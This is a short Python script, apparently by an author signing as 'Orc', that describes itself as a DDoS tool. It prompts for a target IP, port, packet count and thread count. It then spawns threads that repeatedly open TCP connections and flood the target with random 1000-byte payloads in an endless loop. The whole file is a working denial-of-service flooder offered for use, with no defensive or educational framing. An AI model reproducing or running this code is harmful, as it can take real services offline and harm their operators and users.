# Coding Time By : Orc
# Tools Usage By : Orc
# Tools Credit By : Orc
# Orc Ras

# Import Module
import random
import socket
import threading
import os
# Info Tools [ Orc Tools ]
os.system("clear")

print("•------------------------------------•")
print("[+] Tools By Orc")
print("[+] Created By Orc Satiee ")
print("[+] Dont Leak This Ddos tools")
print("[!] Dont Rename This Tools!!!")
print("[#] Credit : Orc satier man")
print("     || TCP || UDP || HTTPS ||         ")
print("•-------------------------------------•")

ip = str(input("[/] Ip : "))
port = int(input("[/] Port Target   : "))
times = int(input("[/] Packet : "))
threads = int(input("[/] Thread : "))

def run():
    data = random._urandom(1000)
    i = random.choice(("[*]","[!]","[#]","[?]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" Orc!!!")
        except socket.error:
            s.close()
            print("[*] ATTACK BY ORC => ",ip," MELUNCUR KE : ",port,"!")

for y in range(threads):
    th = threading.Thread(target = run)
    th.start()
